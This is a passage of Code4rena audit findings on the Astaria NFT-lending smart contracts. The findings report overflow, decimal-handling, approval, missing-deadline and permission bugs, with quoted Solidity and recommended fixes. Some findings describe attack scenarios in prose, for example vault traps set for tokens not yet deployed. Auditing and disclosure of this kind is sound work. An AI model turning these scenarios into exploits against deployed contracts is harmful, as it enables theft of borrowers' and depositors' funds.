has a liensOpenForEpoch of 0. When the borrower repays the loan via LienToken.makePayment, decreaseEpochLienCount fails due to overflow in _payment, resulting in the liquidation of the borrower's collateral ```solidity     } else {       amount = stack.point.amount;       if (isPublicVault) {         // since the openLiens count is only positive when there are liens that haven't been paid off         // that should be liquidated, this lien should not be counted anymore         IPublicVault(lienOwner).decreaseEpochLienCount(           IPublicVault(lienOwner).getLienEpoch(end)         );       } ```  Consider the following scenario where private vault A provides a loan of 1 ETH to the borrower, who deposits NFT worth 2 ETH and borrows 1 ETH. Private Vault A creates Public Vault B using the account alice and predicts the address of Public Vault B before it is created and transfers the lien tokens to it. The borrower calls LienToken.makePayment to repay the loan, but fails due to overflow. The borrower is unable to repay the loan, and when the loan expires, the NFTs used as collateral are auctioned  ## Proof of Concept https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L360-L375 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L847 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L731-L742 https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed ## Tools Used None ## Recommended Mitigation Steps In LienToken.transferFrom, require to.code.length >0, thus preventing the transfer of lien tokens to uncreated public vaults  ```diff   function transferFrom(     address from,     address to,     uint256 id   ) public override(ERC721, IERC721) {     LienStorage storage s = _loadLienStorageSlot();     if (_isPublicVault(s, to)) {       revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);     } +  require(to.code.length > 0);     if (s.lienMeta[id].atLiquidation) {       revert InvalidState(InvalidStates.COLLATERAL_AUCTION);     }     delete s.lienMeta[id].payee;     emit PayeeChanged(id, address(0));     super.transferFrom(from, to, id);   } ```"}, {"title": "Wrong starting price when listing on Seaport for assets that has less than 18 decimals", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/235", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-15"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L639-L647   # Vulnerability details  ## Impact According to Astaria's docs: https://docs.astaria.xyz/docs/protocol-mechanics/loanterms > Liquidation initial ask: Should the NFT go into liquidation, the initial price of the auction will be set to this value. Note that this set as a starting point for a dutch auction, and the price will decrease over the liquidation period. This figure is should also be specified in 10^18 format.  The liquidation initial ask is specififed in 18 decimals. this is then used as a starting price when the NFT goes under auction on OpenSea. However, if the  asset has less than 18 decimals, then the starting price goes wrong to Seaport.   This results in listing the NFT with too high price that makes it unlikely to be sold.   ## Proof of Concept  The starting price is set to the liquidation initial ask: ```sh     listedOrder = s.COLLATERAL_TOKEN.auctionVault(       ICollateralToken.AuctionVaultParams({         settlementToken: stack[position].lien.token,         collateralId: stack[position].lien.collateralId,         maxDuration: auctionWindowMax,         startingPrice: stack[0].lien.details.liquidationInitialAsk,         endingPrice: 1_000 wei       })     ); ``` https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L639-L647  Let's assume the asset is USDC which has 6 decimals: 1. Stratigist signs a strategy with liquidationInitialAsk **1000e18**. 2. Following the docs, this means the starting price is supposed to be **1000** USDC 3. The NFT is being liquidated. 4. 1000e18 is passed to Seaport along with asset USDC. 5. Seaport lists the NFT, and the price will be too high as1000e18 will be **1000000000000000** USDC   ## Tools Used Manual analysis  ## Recommended Mitigation Steps  1. Either fetch the asset's decimals on-chain or add it as a part of the strategy. 2. Convert liquidationInitialAsk to the asset's decimals before passing it as a starting price.    "}, {"title": "When Public Vault A buys out Public Vault B's lien tokens, it does not increase Public Vault A's liensOpenForEpoch, which would result in the lien tokens not being repaid", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/222", "labels": ["bug", "3 (High Risk)", "judge review requested", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-16"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351   # Vulnerability details  ## Impact Vault A can call buyoutLien to buy out Vault B's lien tokens, which calls LienToken.buyoutLien ```solidity   function buyoutLien(     ILienToken.Stack[] calldata stack,     uint8 position,     IAstariaRouter.Commitment calldata incomingTerms   )     external     whenNotPaused     returns (ILienToken.Stack[] memory, ILienToken.Stack memory)   { ...     return       lienToken.buyoutLien(         ILienToken.LienActionBuyout({           position: position,           encumber: ILienToken.LienActionEncumber({             amount: owed,             receiver: recipient(),             lien: ROUTER().validateCommitment({               commitment: incomingTerms,               timeToSecondEpochEnd: _timeToSecondEndIfPublic()             }),             stack: stack ```  In LienToken.buyoutLien, it will burn Vault B's lien token and mint a new lien token for Vault A ```solidity   function _replaceStackAtPositionWithNewLien(     LienStorage storage s,     ILienToken.Stack[] calldata stack,     uint256 position,     Stack memory newLien,     uint256 oldLienId   ) internal returns (ILienToken.Stack[] memory newStack) {     newStack = stack;     newStack[position] = newLien;     _burn(oldLienId);                        // @ audit: burn Vault B's lien token     delete s.lienMeta[oldLienId];   } ...     newLienId = uint256(keccak256(abi.encode(params.lien)));     Point memory point = Point({       lienId: newLienId,       amount: params.amount.safeCastTo88(),       last: block.timestamp.safeCastTo40(),       end: (block.timestamp + params.lien.details.duration).safeCastTo40()     });     _mint(params.receiver, newLienId); // @ audit: mint a new lien token for Vault A     return (newLienId, Stack({lien: params.lien, point: point}));   } ```  And, when Vault B is a public vault, the handleBuyoutLien function of Vault B will be called to decrease liensOpenForEpoch However, when Vault A is a public vault, it does not increase the liensOpenForEpoch of Vault A ```solidity     if (_isPublicVault(s, payee)) {       IPublicVault(payee).handleBuyoutLien(         IPublicVault.BuyoutLienParams({           lienSlope: calculateSlope(params.encumber.stack[params.position]),           lienEnd: params.encumber.stack[params.position].point.end,           increaseYIntercept: buyout -             params.encumber.stack[params.position].point.amount         })       );     } ...   function handleBuyoutLien(BuyoutLienParams calldata params)     public     onlyLienToken   {     VaultData storage s = _loadStorageSlot();      unchecked {       uint48 newSlope = s.slope - params.lienSlope.safeCastTo48();       _setSlope(s, newSlope);       s.yIntercept += params.increaseYIntercept.safeCastTo88();       s.last = block.timestamp.safeCastTo40();     }      _decreaseEpochLienCount(s, getLienEpoch(params.lienEnd.safeCastTo64()));  // @audit: decrease liensOpenForEpoch      emit YInterceptChanged(s.yIntercept);   } ``` Since the liensOpenForEpoch of the public vault decreases when the lien token is repaid, and since the liensOpenForEpoch of public vault A is not increased, then when that lien token is repaid, _payment will fail due to overflow when decreasing the liensOpenForEpoch. ```solidity     } else {       amount = stack.point.amount;       if (isPublicVault) {         // since the openLiens count is only positive when there are liens that haven't been paid off         // that should be liquidated, this lien should not be counted anymore         IPublicVault(lienOwner).decreaseEpochLienCount(  //  @audit: overflow here           IPublicVault(lienOwner).getLienEpoch(end)         );       } ``` Consider the following case. Public Vault B holds a lien token and B.liensOpenForEpoch == 1 Public Vault A buys out B's lien token for refinancing, B.liensOpenForEpoch == 0, A.liensOpenForEpoch == 0 borrower wants to repay the loan, in the _payment function, the decreaseEpochLienCount function of Vault A will be called, `A.liensOpenForEpoch-- `will trigger an overflow, resulting in borrower not being able to repay the loan, and borrower's collateral will be auctioned off, but in the call to updateVaultAfterLiquidation function will also fail in decreaseEpochLienCount due to the overflow ```solidity   function updateVaultAfterLiquidation(     uint256 maxAuctionWindow,     AfterLiquidationParams calldata params   ) public onlyLienToken returns (address withdrawProxyIfNearBoundary) {     VaultData storage s = _loadStorageSlot();      _accrue(s);     unchecked {       _setSlope(s, s.slope - params.lienSlope.safeCastTo48());     }      if (s.currentEpoch != 0) {       transferWithdrawReserve();     }     uint64 lienEpoch = getLienEpoch(params.lienEnd);     _decreaseEpochLienCount(s, lienEpoch); //  @audit: overflow here ``` As a result, the borrower cannot repay the loan and the borrower's collateral cannot be auctioned off, thus causing the depositor of the public vault to suffer a loss ## Proof of Concept https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L843 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L640-L655 ## Tools Used None ## Recommended Mitigation Steps In LienToken.buyoutLien, when the caller is a public vault, increase the decreaseEpochLienCount of the public vault "}, {"title": "Function withdraw() and redeem() in ERC4626RouterBase would revert always because they have unnecessary allowance setting", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/175", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-23"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L48 https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L62   # Vulnerability details  ## Impact Functions withdraw() and redeem()  in ERC4626RouterBase  are used to withdraw user funds from vaults and they call `vault.withdraw()` and `vault.redeem()` and logics in vault transfer user shares and user required to give spending allowance for vault and there is no need for ERC4626RouterBase to set approval for vault and because those approved tokens won't be used and code uses `safeApprove()` so next calls to `withdraw()` and `redeem()` would revert because code would tries to change allowance amount while it's not zero. those functions would revert always and AstariaRouter uses them and user won't be able to use those function and any other protocol integrating with Astaria calling those function would have broken logic. also if UI interact with protocol with router functions then UI would have broken parts too. and functions in router support users to set slippage allowance and without them users have to interact with vault directly and they may lose funds because of the slippage.  ## Proof of Concept This is `withdraw()` and `redeem()` code in ERC4626RouterBase: ```   function withdraw(     IERC4626 vault,     address to,     uint256 amount,     uint256 maxSharesOut   ) public payable virtual override returns (uint256 sharesOut) {      ERC20(address(vault)).safeApprove(address(vault), amount);     if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesOut) {       revert MaxSharesError();     }   }    function redeem(     IERC4626 vault,     address to,     uint256 shares,     uint256 minAmountOut   ) public payable virtual override returns (uint256 amountOut) {      ERC20(address(vault)).safeApprove(address(vault), shares);     if ((amountOut = vault.redeem(shares, to, msg.sender)) < minAmountOut) {       revert MinAmountError();     }   } ``` As you can see the code sets approval for vault to spend routers vault tokens and then call vault function. this is `_redeemFutureEpoch()` code in the vault which handles withdraw and redeem: ```   function _redeemFutureEpoch(     VaultData storage s,     uint256 shares,     address receiver,     address owner,     uint64 epoch   ) internal virtual returns (uint256 assets) {     // check to ensure that the requested epoch is not in the past      ERC20Data storage es = _loadERC20Slot();      if (msg.sender != owner) {       uint256 allowed = es.allowance[owner][msg.sender]; // Saves gas for limited approvals.        if (allowed != type(uint256).max) {         es.allowance[owner][msg.sender] = allowed - shares;       }     }      if (epoch < s.currentEpoch) {       revert InvalidState(InvalidStates.EPOCH_TOO_LOW);     }     require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");     // check for rounding error since we round down in previewRedeem.      //this will underflow if not enough balance     es.balanceOf[owner] -= shares;      // Cannot overflow because the sum of all user     // balances can't exceed the max uint256 value.     unchecked {       es.balanceOf[address(this)] += shares;     }      emit Transfer(owner, address(this), shares);     // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch     _deployWithdrawProxyIfNotDeployed(s, epoch);      emit Withdraw(msg.sender, receiver, owner, assets, shares);      // WithdrawProxy shares are minted 1:1 with PublicVault shares     WithdrawProxy(s.epochData[epoch].withdrawProxy).mint(shares, receiver);   } ``` As you can see this code only check spending allowance that real owner of shares gives to the `msg.sender` and there is no check or updating spending allowance of the router vaulttokens for vault. so those approvals in the `withdraw()` and `redeem()` are unnecessary and they would cause code to revert always because code tries to set approval with `safeApprove()` while the current allowance is not zero. this issue would cause calls to withdraw() and redeem() function to revert. any other protocol integrating with Astaria using those functions would have broken logic and also users would lose gas if they use those functions. contract AstariaRouter inherits ERC4626RouterBase and uses its `withdraw()` and `redeem()` function so users can't call `AstariaRouter.withdraw()` or `AstariaRouter.redeem()`which supports slippage allowance and they have to call vault's functions directly and they may lose funds because of the slippage.  ## Tools Used VIM  ## Recommended Mitigation Steps remove unnecessary code"}, {"title": "VAULT CAN BE CREATED FOR NOT-YET-EXISTING ERC20 TOKENS, WHICH ALLOWS ATTACKERS TO SET TRAPS TO STEAL NFTs FROM BORROWERS", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/158", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-25"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L795 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L66 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L72 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L394 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L406 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L161 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L269 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L298   # Vulnerability details  ## Impact There is a subtle difference between the implementation of solmate\u2019s SafeTransferLib and OZ\u2019s SafeERC20: OZ\u2019s SafeERC20 checks if the token is a contract or not, solmate\u2019s SafeTransferLib does not. See: https://github.com/Rari-Capital/solmate/blob/main/src/utils/SafeTransferLib.sol#L9 Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller. As a result, when the token\u2019s address has no code, the transaction will just succeed with no error. This attack vector was made well-known by the qBridge hack back in Jan 2022.  In AstariaRouter, Vault, PublicVault, VaultImplementation, ClearingHouse, TransferProxy, and WithdrawProxy, the ```safetransfer``` and ```safetransferfrom``` don't check the existence of code at the token address. This is a known issue while using solmate\u2019s libraries.  Hence this can lead to miscalculation of funds and also loss of funds , because if safetransfer() and safetransferfrom() are called on a token address that doesn\u2019t have contract in it, it will always return success. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred. So this will lead to miscalculation and loss of funds.    ### Attack scenario (example): It\u2019s becoming popular for protocols to deploy their token across multiple networks and when they do so, a common practice is to deploy the token contract from the same deployer address and with the same nonce so that the token address can be the same for all the networks. A sophisticated attacker can exploit it by taking advantage of that and setting traps on multiple potential tokens to steal from the borrowers. For example: 1INCH is using the same token address for both Ethereum and BSC; Gelato's $GEL token is using the same token address for Ethereum, Fantom and Polygon.   - ProjectA has TokenA on another network; - ProjectB has TokenB on another network; - ProjectC has TokenC on another network; - A malicious strategist (Bob) can create new PublicVaults with amounts of 10000E18 for TokenA, TokenB, and TokenC.  - A few months later, ProjectB lunched TokenB on the local network at the same address; - Alice as a liquidator deposited 11000e18 TokenB into the vault; - The attacker (Bob) can withdraw to receive most of Alice added TokenB.  ## Proof of Concept https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L795 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L66 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/Vault.sol#L72 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L394 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L406 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L161 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L269 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L298   ## Tools Used Manual Audit ## Recommended Mitigation Steps This issue won\u2019t exist if OpenZeppelin\u2019s SafeERC20 is used instead."}, {"title": "CollateralToken should allow to execute token owner's action to approved addresses", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/134", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-26"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L274 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L266 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L238   # Vulnerability details  ## Impact  CollateralToken should allow to execute token owner's action to approved addresses  ## Proof of Concept  Let us look into the code below in VaultImplementation#_validateCommitment  ```solidity function _validateCommitment( IAstariaRouter.Commitment calldata params, address receiver ) internal view { uint256 collateralId = params.tokenContract.computeId(params.tokenId); ERC721 CT = ERC721(address(COLLATERAL_TOKEN())); address holder = CT.ownerOf(collateralId); address operator = CT.getApproved(collateralId); if (   msg.sender != holder &&   receiver != holder &&   receiver != operator &&   !CT.isApprovedForAll(holder, msg.sender) ) {   revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY); } ```  the code check should also check that msg.sender != operator to make the check complete, if the msg.sender comes from an approved operator, the call should be valid  ```solidity if (   msg.sender != holder &&   receiver != holder &&   receiver != operator &&   msg.sender != operator &&   !CT.isApprovedForAll(holder, msg.sender) ) {   revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY); } ```  AND  CollateralToken functions flashAction, releaseToAddress are restricted to the owner of token only. But they should be allowed for approved addresses as well.  For example, in flashAuction, only the owner of the collateral token can start the flashAction, then approved operator by owner cannot start flashAction  ```solidity   function flashAction(     IFlashAction receiver,     uint256 collateralId,     bytes calldata data   ) external onlyOwner(collateralId) { ```  note the check onlyOwner(collateralId) does not check if the msg.sender is an approved operator.  ```solidity modifier onlyOwner(uint256 collateralId) {  require(ownerOf(collateralId) == msg.sender);  _; } ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add ability for approved operators to call functions that can be called by the collateral token owner."}, {"title": "Approved operator of collateral owner can't liquidate lien", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/133", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-27"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L611-L619 https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L237-L244   # Vulnerability details  ## Impact Approved operator of collateral owner can't liquidate lien  ## Proof of Concept If someone wants to liquidate lien then `canLiquidate` function [is called](https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L625-L627) to check if it's possible. https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L611-L619 ```soldiity   function canLiquidate(ILienToken.Stack memory stack)     public     view     returns (bool)   {     RouterStorage storage s = _loadRouterSlot();     return (stack.point.end <= block.timestamp ||       msg.sender == s.COLLATERAL_TOKEN.ownerOf(stack.lien.collateralId));   } ```  As you can see owner of collateral token can liquidate lien in any moment. However approved operators of owner can't do that, however they should.  As while validating commitment it's allowed for approved operator [to request a loan](https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L237-L244). That means that owner of collateral token can approve some operators to allow them to work with their debts. So they should be able to liquidate loan as well. ## Tools Used VsCode ## Recommended Mitigation Steps Add ability for approved operators to liqiudate lien."}, {"title": "Lack of support for ERC20 token that is not 18 decimals", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/129", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-28"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L66 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L73   # Vulnerability details  ## Impact  Lack of support for ERC20 token that is not 18 decimals in PublicVault.sol  ## Proof of Concept  We need to look into the PublicVault.sol implementation  ```solidity contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned { ```  the issue that is the decimal precision in the PublicVault is hardcoded to 18  ```solidity function decimals()  public  pure  virtual  override(IERC20Metadata) returns (uint8) {  return 18; } ```  According to   https://eips.ethereum.org/EIPS/eip-4626  > Although the convertTo functions should eliminate the need for any use of an EIP-4626 Vault\u2019s decimals variable, it is still strongly recommended to mirror the underlying token\u2019s decimals if at all possible, to eliminate possible sources of confusion and simplify integration across front-ends and for other off-chain users.  The solmate ERC4626 implementation did mirror the underlying token decimals  https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L38  ```solidity constructor(  ERC20 _asset,  string memory _name,  string memory _symbol ) ERC20(_name, _symbol, _asset.decimals()) {  asset = _asset; } ```  but the token decimals is over-written to 18 decimals.  https://github.com/d-xo/weird-erc20#low-decimals  Some tokens have low decimals (e.g. USDC has 6). Even more extreme, some tokens like Gemini USD only have 2 decimals.  For example, if the underlying token is USDC and has 6 decimals, the convertToAssets() function will be broken.  https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L130  ```solidity function convertToAssets(uint256 shares) public view virtual returns (uint256) {  uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.   return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply); } ```  the totalSupply is in 18 deimals, but the totalAssets is in 6 deciimals, but the totalSupply should be 6 decimals as well to match the underlying token precision.  There are place tha the code assume the token is 18 decimals, if the token is not 18 decimals, the logic for liquidatoin ratio calculation is broken as well because the hardcoded 1e18 is used.  ```solidity s.liquidationWithdrawRatio = proxySupply .mulDivDown(1e18, totalSupply()) .safeCastTo88();  currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio); uint256 expected = currentWithdrawProxy.getExpected();  unchecked { if (totalAssets() > expected) {   s.withdrawReserve = (totalAssets() - expected)  .mulWadDown(s.liquidationWithdrawRatio)  .safeCastTo88(); } else {   s.withdrawReserve = 0; } } _setYIntercept( s, s.yIntercept -   totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18) ); ```  and In the claim function for WithdrawProxy.sol  ```solidity if (balance < s.expected) {   PublicVault(VAULT()).decreaseYIntercept(  (s.expected - balance).mulWadDown(1e18 - s.withdrawRatio)   ); } else {   PublicVault(VAULT()).increaseYIntercept(  (balance - s.expected).mulWadDown(1e18 - s.withdrawRatio)   ); } ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the protocol make the PublicVault.sol decimal match the underlying token decimals."}, {"title": "Vault's don't verify that a strategy's deadline has passed", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/122", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-19"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L229-L266 https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L439   # Vulnerability details  ## Impact The vault doesn't verify that a deadline hasn't passed when a commitment is validated. Users are able to take out loans using strategies that have already expired. Depending on the nature of the strategy that can cause a loss of funds for the LPs.  ## Proof of Concept When you take out a loan using the AstariaRouter, the deadline is verified: ```sol   function _validateCommitment(     RouterStorage storage s,     IAstariaRouter.Commitment calldata commitment,     uint256 timeToSecondEpochEnd   ) internal view returns (ILienToken.Lien memory lien) {     if (block.timestamp > commitment.lienRequest.strategy.deadline) {       revert InvalidCommitmentState(CommitmentState.EXPIRED);     } // ... ``` But, `VaultImplementation._validateCommitment()` skips that check: ```sol   function _validateCommitment(     IAstariaRouter.Commitment calldata params,     address receiver   ) internal view {     uint256 collateralId = params.tokenContract.computeId(params.tokenId);     ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));     address holder = CT.ownerOf(collateralId);     address operator = CT.getApproved(collateralId);     if (       msg.sender != holder &&       receiver != holder &&       receiver != operator &&       !CT.isApprovedForAll(holder, msg.sender)     ) {       revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);     }     VIData storage s = _loadVISlot();     address recovered = ecrecover(       keccak256(         _encodeStrategyData(           s,           params.lienRequest.strategy,           params.lienRequest.merkle.root         )       ),       params.lienRequest.v,       params.lienRequest.r,       params.lienRequest.s     );     if (       (recovered != owner() && recovered != s.delegate) ||       recovered == address(0)     ) {       revert IVaultImplementation.InvalidRequest(         InvalidRequestReason.INVALID_SIGNATURE       );     }   } ```  If you search for `deadline` in the codebase you'll see that there's no other place where the property is accessed.  As long as the user takes out the loan from the vault directly, they can use strategies that have expired. The vault owner could prevent this from happening by incrementing the `strategistNonce` after the strategy expired.  ## Tools Used none  ## Recommended Mitigation Steps In `VaultImplementation._validateCommitment()` check that `deadline > block.timestamp`."}, {"title": "Certain function can be blocked if the ERC20 token revert in 0 amount transfer after PublicVault#transferWithdrawReserve is called", "html_url": "https://github.com/code-423n4/2023-01-astaria-findings/issues/54", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-32"], "target": "2023-01-astaria-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L295 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L421 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L359 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L372 https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L384   # Vulnerability details  ## Impact   Certain function can be blocked if the ERC20 token revert in 0 amount transfer after PublicVault#transferWithdrawReserve is called  ## Proof of Concept  The function transferWithdrawReserve in Public Vault has no access control.  ```solidity   function transferWithdrawReserve() public {     VaultData storage s = _loadStorageSlot();      if (s.currentEpoch == uint64(0)) {       return;     }      address currentWithdrawProxy = s       .epochData[s.currentEpoch - 1]       .withdrawProxy;     // prevents transfer to a non-existent WithdrawProxy     // withdrawProxies are indexed by the epoch where they're deployed     if (currentWithdrawProxy != address(0)) {       uint256 withdrawBalance = ERC20(asset()).balanceOf(address(this));        // prevent transfer of more assets then are available       if (s.withdrawReserve <= withdrawBalance) {         withdrawBalance = s.withdrawReserve;         s.withdrawReserve = 0;       } else {         unchecked {           s.withdrawReserve -= withdrawBalance.safeCastTo88();         }       }        ERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance);       WithdrawProxy(currentWithdrawProxy).increaseWithdrawReserveReceived(         withdrawBalance       );       emit WithdrawReserveTransferred(withdrawBalance);     }      address withdrawProxy = s.epochData[s.currentEpoch].withdrawProxy;     if (       s.withdrawReserve > 0 &&       timeToEpochEnd() == 0 &&       withdrawProxy != address(0)     ) {       address currentWithdrawProxy = s         .epochData[s.currentEpoch - 1]         .withdrawProxy;       uint256 drainBalance = WithdrawProxy(withdrawProxy).drain(         s.withdrawReserve,         s.epochData[s.currentEpoch - 1].withdrawProxy       );       unchecked {         s.withdrawReserve -= drainBalance.safeCastTo88();       }       WithdrawProxy(currentWithdrawProxy).increaseWithdrawReserveReceived(         drainBalance       );     }   } ```  If this function is called, the token balance is transfered to 